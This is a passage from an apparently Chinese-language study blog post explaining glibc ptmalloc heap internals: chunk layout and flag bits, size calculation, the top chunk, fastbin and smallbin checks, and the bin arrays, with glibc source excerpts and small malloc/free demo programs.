class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span>  <span class="comment">// </span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag' method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of chunk, in bytes                     |A|M|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             User data starts here...                          .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .             (malloc_usable_size() bytes)                      .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             (size of chunk, but used for application data)    |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of next chunk, in bytes                |A|0|1|</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    Where "chunk" is the front of the chunk for the purpose of most of</span></span><br><span class="line"><span class="comment">    the malloc code, but "mem" is the pointer that is returned to the</span></span><br><span class="line"><span class="comment">    user.  "Nextchunk" is the beginning of the next contiguous chunk.</span></span><br><span class="line"><span class="comment">    Chunks always begin on even word boundaries, so the mem portion</span></span><br><span class="line"><span class="comment">    (which is returned to the user) is also on an even word boundary, and</span></span><br><span class="line"><span class="comment">    thus at least double-word aligned.</span></span><br><span class="line"><span class="comment">    Free chunks are stored in circular doubly-linked lists, and look like this:</span></span><br><span class="line"><span class="comment">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of previous chunk, if unallocated (P clear)  |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `head:' |             Size of chunk, in bytes                     |A|0|P|</span></span><br><span class="line"><span class="comment">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Forward pointer to next chunk in list             |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Back pointer to previous chunk in list            |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Unused space (may be 0 bytes long)                .</span></span><br><span class="line"><span class="comment">            .                                                               .</span></span><br><span class="line"><span class="comment">            .                                                               |</span></span><br><span class="line"><span class="comment">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    `foot:' |             Size of chunk, in bytes                           |</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">            |             Size of next chunk, in bytes                |A|0|0|</span></span><br><span class="line"><span class="comment">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="comment">    The P (PREV_INUSE) bit, stored in the unused low-order bit of the</span></span><br><span class="line"><span class="comment">    chunk size (which is always a multiple of two words), is an in-use</span></span><br><span class="line"><span class="comment">    bit for the *previous* chunk.  If that bit is *clear*, then the</span></span><br><span class="line"><span class="comment">    word before the current chunk size contains the previous chunk</span></span><br><span class="line"><span class="comment">    size, and can be used to find the front of the previous chunk.</span></span><br><span class="line"><span class="comment">    The very first chunk allocated always has this bit set,</span></span><br><span class="line"><span class="comment">    preventing access to non-existent (or non-owned) memory. If</span></span><br><span class="line"><span class="comment">    prev_inuse is set for any given chunk, then you CANNOT determine</span></span><br><span class="line"><span class="comment">    the size of the previous chunk, and might even get a memory</span></span><br><span class="line"><span class="comment">    addressing fault when trying to do so.</span></span><br><span class="line"><span class="comment">    The A (NON_MAIN_ARENA) bit is cleared for chunks on the initial,</span></span><br><span class="line"><span class="comment">    main arena, described by the main_arena variable.  When additional</span></span><br><span class="line"><span class="comment">    threads are spawned, each thread receives its own arena (up to a</span></span><br><span class="line"><span class="comment">    configurable limit, after which arenas are reused for multiple</span></span><br><span class="line"><span class="comment">    threads), and the chunks in these arenas have the A bit set.  To</span></span><br><span class="line"><span class="comment">    find the arena for a chunk on such a non-main arena, heap_for_ptr</span></span><br><span class="line"><span class="comment">    performs a bit mask operation and indirection through the ar_ptr</span></span><br><span class="line"><span class="comment">    member of the per-heap header heap_info (see arena.c).</span></span><br><span class="line"><span class="comment">    Note that the `foot' of the current chunk is actually represented</span></span><br><span class="line"><span class="comment">    as the prev_size of the NEXT chunk. This makes it easier to</span></span><br><span class="line"><span class="comment">    deal with alignments etc but can be very confusing when trying</span></span><br><span class="line"><span class="comment">    to extend or adapt this code.</span></span><br><span class="line"><span class="comment">    The three exceptions to all this are:</span></span><br><span class="line"><span class="comment">     1. The special chunk `top' doesn't bother using the</span></span><br><span class="line"><span class="comment">        trailing size field since there is no next contiguous chunk</span></span><br><span class="line"><span class="comment">        that would have to index off it. After initialization, `top'</span></span><br><span class="line"><span class="comment">        is forced to always exist.  If it would become less than</span></span><br><span class="line"><span class="comment">        MINSIZE bytes long, it is replenished.</span></span><br><span class="line"><span class="comment">     2. Chunks allocated via mmap, which have the second-lowest-order</span></span><br><span class="line"><span class="comment">        bit M (IS_MMAPPED) set in their size fields.  Because they are</span></span><br><span class="line"><span class="comment">        allocated one-by-one, each must contain its own trailing size</span></span><br><span class="line"><span class="comment">        field.  If the M bit is set, the other bits are ignored</span></span><br><span class="line"><span class="comment">        (because mmapped chunks are neither in an arena, nor adjacent</span></span><br><span class="line"><span class="comment">        to a freed chunk).  The M bit is also used for chunks which</span></span><br><span class="line"><span class="comment">        originally came from a dumped heap via malloc_set_state in</span></span><br><span class="line"><span class="comment">        hooks.c.</span></span><br><span class="line"><span class="comment">     3. Chunks in fastbins are treated as allocated chunks from the</span></span><br><span class="line"><span class="comment">        point of view of the chunk allocator.  They are consolidated</span></span><br><span class="line"><span class="comment">        with their neighbors only in bulk, in malloc_consolidate.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h3 id="chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位"><a href="#chunk的NON-MAIN-ARENA、IS-MAPPED、PREV-INUSE位" class="headerlink" title="chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位"></a>chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位</h3><ul><li><p><strong>NON_MAIN_ARENA：</strong>记录当前 chunk 是否不属于主线程</p></li><li><p><strong>IS_MAPPED：</strong>记录当前chunk是否是由mmap分配的</p></li><li><p><strong>PREV_INUSE：</strong>如果前面一个chunk处于分配状态，那么此位为1。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个chunk 的size 的P位为0时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲chunk之间的合并</p><h3 id="发生在-int-free函数中的合并操作"><a href="#发生在-int-free函数中的合并操作" class="headerlink" title="发生在_int_free函数中的合并操作"></a>发生在_int_free函数中的合并操作</h3>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">        prevsize = prev_size (p);                   <span class="comment">//1</span></span><br><span class="line">        <span class="built_in">size</span> += prevsize;                           <span class="comment">//2</span></span><br><span class="line">        p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize)); <span class="comment">//3</span></span><br><span class="line">        unlink(av, p, bck, fwd);                    <span class="comment">//4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong><em>\</em>函数解析：**</strong></p><ul><li><p>首先使用prev_inuse宏定义判断p的PREV_INUSE位是否为0</p></li><li><p>如果PREV_INUSE位为0，那么prev_inuse宏返回0，if条件为1，进入if语句体中</p></li><li><p>1.通过recv_size函数得到前面要合并的chunk的大小</p></li><li><p>2.将自己的大小与前面的presize相加得到合并后的chunk的大小</p></li><li><p>3.将p的指针向前移动，移动到前面那个chunk的开头处</p></li><li><p>4.unlink是将两个要合并的chunk各自从原来的bin链上面断下来，然后进行合并</p><p>  <img src="/images/Heap/20190724193910998.png" alt="img"></p></li></ul></li></ul><h3 id="chunk的mchunk-prev-size成员的空间复用"><a href="#chunk的mchunk-prev-size成员的空间复用" class="headerlink" title="chunk的mchunk_prev_size成员的空间复用"></a>chunk的mchunk_prev_size成员的空间复用</h3><p><strong>成员介绍</strong></p><ul><li>①如果本chunk前面一个chunk处于空闲状态，那么mchunk_prev_size成员才有用，此时用来记录前一个chunk的大小</li><li>②如果本chunk前面一个chunk处于使用状态，那么mchunk_prev_size成员对于本chunk来说是不使用的</li></ul><p><strong>mchunk_prev_size成员的合并操作</strong></p><ul><li>当前一个chunk申请的数据空间申请的大小对16取余后，如果多出来的大小小于等于8字节，那么这个多出来的大小就放入下一个chunk的mchunk_prev_size中存储</li><li>否则，如果多出来的大小大于8字节，那么前一个chunk就不使用下一个chunk的mchunk_prev_size成员</li></ul><h3 id="chunk块大小计算"><a href="#chunk块大小计算" class="headerlink" title="chunk块大小计算"></a>chunk块大小计算</h3><p>malloc的参数不等于实际分配堆块的大小，事实上ptmalloc分配出来的大小是对齐的。这个长度一般使字长的2倍，比如32位系统使8个字节，64位系统是16个字节。但是对于不大于2倍字长的请求，malloc会直接返回2倍字长的块也就是最小chunk，比如64位系统执行malloc(0)会返回用户区域为16字节的块</p><p><strong>demo</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x10</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%p\n"</span>,p); <span class="comment">//打印malloc可以存储的起始地址，即p可以访问的开始地址</span></span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p);    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>在pwndng中通过heap 命令可以查看到申请堆块的地址（printf申请到的缓冲区空间大小在1024byte），在上面程序的运行当中printf()函数申请缓冲空间时在p 后面（关于这个后面我会放个程序的结构图验证一下），所以printf应该在高地址开辟空间。所以此时可以使用printf在堆块的地址减去malloc申请空间的地址，如下图所示， 0x602020-0x602000 = 0x20, 代表了我们在glibc中实际申请了0x10+0x10=20的堆chunk。通过printf 打印出来的p可以访问的起始地址，我们可以得知malloc_chunk结构体的前两个成员（size之前)加起来的大小</p><p><img src="/images/Heap/20190722171233411.png" alt="img"></p><p>图中两个malloc_chunk的size大小 = 33 = ox20+1（PREV_INUSE位为1）</p><p><strong>先后分配堆块时堆块地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;       </span><br><span class="line">        <span class="keyword">void</span> *p1 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"p1: %p\n"</span>,p1)</span><br><span class="line">        <span class="keyword">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"p2:%p\n"</span>,p2);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/Heap/image-20200903085131895.png" alt="image-20200903085131895"></p><p>可以看到p1,p2 打印出来的可访问起始地址</p><p><img src="/images/Heap/image-20200903085423917.png" alt="image-20200903085423917"></p><p>因为 调用了两次printf ，printf需要申请缓冲区空间，所以两个chunk块的空间不连续，但单单从p1，p2的起始地址来看，先申请的堆块位于低地址</p><p><strong>chunk的实际大小</strong></p><ul><li><p>当用户通过malloc函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员</p></li><li><p>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员</p></li><li><p>例如：malloc(0x10);申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10=0x20大小的空间</p></li><li><p>前面文章介绍过chunk的mchunk_prev_size成员的合并操作，所以chunk的实际大小还要配合这个规则：<a href="https://blog.csdn.net/qq_41453285/article/details/97158973" target="_blank" rel="noopener">https://blog.csdn.net/qq_41453285/article/details/97158973</a></p></li><li><p><strong>总结：</strong>chunk的实际大小=malloc的大小+chunk的前两个成员+mchunk_prev_size成员的合并操作+chunk对齐规则</p><h3 id="pre-inuse的合并操作"><a href="#pre-inuse的合并操作" class="headerlink" title="pre_inuse的合并操作"></a>pre_inuse的合并操作</h3>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> <span class="built_in">size</span>=<span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">void</span> *p1=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p2=<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">void</span> *p3=<span class="built_in">malloc</span>(<span class="built_in">size</span>); <span class="comment">//为了达到演示效果，防止合并后的chunk与top chunk合并</span></span><br><span class="line"> </span><br><span class="line">    sleep(<span class="number">0</span>);  <span class="comment">//只为了打断点使用，无其他用处</span></span><br><span class="line">    <span class="built_in">free</span>(p1);    </span><br><span class="line">    <span class="built_in">free</span>(p2);   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <img src="/images/Heap/image-20200905165701717.png" alt="image-20200905165701717"></p></li></ul><p>打断点下到sleep ，查看heap 图，在glibc2.6后分配malloc_chunk时除了最后的top chunk外，在开头还多了一块</p><p>在tcache机制下，实验并不成功。 tcache组阻止两个chunk合并</p><h3 id="chunk的最低大小"><a href="#chunk的最低大小" class="headerlink" title="chunk的最低大小"></a>chunk的最低大小</h3><p>最小的chunk需要保证能放下prev_seiz, siez, fd以及bk字段并保证对齐。在32位系统中，即16字节，在64位系统中，一般位32字节。在64位系统中也可能定义INTERNAL_SIZE_T也即size_t为</p><p>在32位系统中，</p><ul><li><p>前面介绍过，malloc的堆块大小在glibc中会加上前两个成员的大小（0x10大小），所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。（即使malloc没有指定大小，也要分配fd和bk成员，所以加起来就是malloc_chunk结构体的前4个成员的大小总和）</p></li><li><p><strong>总结：</strong>chunk的最低大小一定为0x20大小 (64位)  // 第一次malloc(待定)</p><p>第一次malloc时会</p><p>在64位系统中也可同</p></li><li><p>mchunk_size成员显示的是当前chunk的大小加上[NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE]的值</p></li><li><p>这个成员显示的大小并不等价于该chunk在内存中的大小，但是我们可以通过该成员推断出chunk的大小以及[NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE]位的值</p></li></ul><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Top</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The top-most available chunk (i.e., the one bordering the end of</span></span><br><span class="line"><span class="comment">    available memory) is treated specially. It is never included in</span></span><br><span class="line"><span class="comment">    any bin, is used only if no other chunk is available, and is</span></span><br><span class="line"><span class="comment">    released back to the system if it is very large (see</span></span><br><span class="line"><span class="comment">    M_TRIM_THRESHOLD).  Because top initially</span></span><br><span class="line"><span class="comment">    points to its own bin with initial zero size, thus forcing</span></span><br><span class="line"><span class="comment">    extension on the first malloc request, we avoid having any special</span></span><br><span class="line"><span class="comment">    code in malloc to check whether it even exists yet. But we still</span></span><br><span class="line"><span class="comment">    need to do so when getting memory from system, so we make</span></span><br><span class="line"><span class="comment">    initial_top treat the bin as a legal but unusable chunk during the</span></span><br><span class="line"><span class="comment">    interval between initialization and the first call to</span></span><br><span class="line"><span class="comment">    sysmalloc. (This is somewhat delicate, since it relies on</span></span><br><span class="line"><span class="comment">    the 2 preceding words to be zero during this interval as well.)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Conveniently, the unsorted bin can be used as dummy top on first call */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> initial_top(M) (unsorted_chunks(M))</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序第一次进行 <span class="built_in">malloc</span> 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</span><br></pre></td></tr></table></figure><p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p><p><strong>初始情况下，我们可以将unsorted chunk作为 top chunk</strong></p><h3 id="malloc-一个chunk-的检查机制"><a href="#malloc-一个chunk-的检查机制" class="headerlink" title="malloc 一个chunk 的检查机制"></a>malloc 一个chunk 的检查机制</h3><p>当malloc时，如果fastbins，smallbins种有满足需求的chunk可以使用时，malloc就会在相关的bins链中寻找可用的freechunk来使用 ，<strong>但是取走一个freekchunk是有检测机制的</strong></p><h4 id="fastbin的检测机制"><a href="#fastbin的检测机制" class="headerlink" title="fastbin的检测机制"></a>fastbin的检测机制</h4><h3 id="机制规则如下："><a href="#机制规则如下：" class="headerlink" title="机制规则如下："></a><strong>机制规则如下：</strong></h3><ul><li><strong>检测1：</strong>检测你要malloc的freechunk的大小是否在该chunk所在的fastbin链的大小尺寸范围内（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这个chunk却是0x50，那么就会程序就报错退出）</li><li><strong>检测2：</strong>检测你这个freechunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测</li></ul><p><img src="/images/Heap/20190730105842374.png" alt="img"></p><blockquote><h5 id="check-remalloced-chunk函数："><a href="#check-remalloced-chunk函数：" class="headerlink" title="check_remalloced_chunk函数："></a><strong>check_remalloced_chunk函数：</strong></h5><ul><li><strong>函数功能：</strong>该函数主要用来检测chunk的NON_MAIN_ARENA、IS_MAPPED、PREV_INUSE位。该函数中的if会判断chunk是否为mmap申请，还有是否为main_arena管理等</li><li><strong>在fastbin中：</strong>主要用来会检测你要malloc的这个chunk的PREV_INUSE为是否为1</li><li>如果是正常chunk就可以过这个检测，但是是fastbin attack，那么需要设计来跳过这个检测</li></ul><p><img src="/images/Heap/20190812193650809.png" alt="img"></p></blockquote><h4 id="small-bin的检测机制"><a href="#small-bin的检测机制" class="headerlink" title="small bin的检测机制"></a>small bin的检测机制</h4><ul><li>判断下一个chunk的fd指针释放为自己，victim此时为要malloc出去的chunk，bck是后一个chunk</li><li>如果使用了unlink攻击，那么bk就被改了，从而bck就改了，那么bck的fd也就变了，此时就出错了</li></ul><p><img src="/images/Heap/20190810092142921.png" alt="img"></p><h3 id="bin链（struct-malloc-state"><a href="#bin链（struct-malloc-state" class="headerlink" title="bin链（struct malloc_state)"></a>bin链（struct malloc_state)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> *<span class="title">mfastbinptr</span>;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];c</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">/*other member*/</span></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure><ul><li><strong>fastbinY数组：</strong>大小为10。记录的是fast bin链</li><li><strong>bins数组：</strong>大小为129。记录的是unsorted bin（1）、small bin（2<del>63）、large bin链（64</del>126）</li></ul><h3 id="关于几个bin链成员"><a href="#关于几个bin链成员" class="headerlink" title="关于几个bin链成员"></a>关于几个bin链成员</h3><p><a href="https://blog.csdn.net/qq_41453285/article/details/96865321" target="_blank" rel="noopener">参考1</a></p><ul><li><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4></li></ul><p>0x30<del>0x40  （0x20</del>0x80)   单链表（LIFO)</p><p>相邻空间不会被合并，不清理pre_inue (p位：判断前一个chunk是否被使用)</p><p>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小</p><p><strong>fastbin 的索引</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[ idx ])</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* offset 2 to use otherwise unindexable first 2 bins */</span></span><br><span class="line"><span class="comment">// chunk size=2*size_sz*(2+idx)</span></span><br><span class="line"><span class="comment">// 这里要减2，否则的话，前两个bin没有办法索引到。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz)                                                      \</span></span><br><span class="line">    ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的 chunk 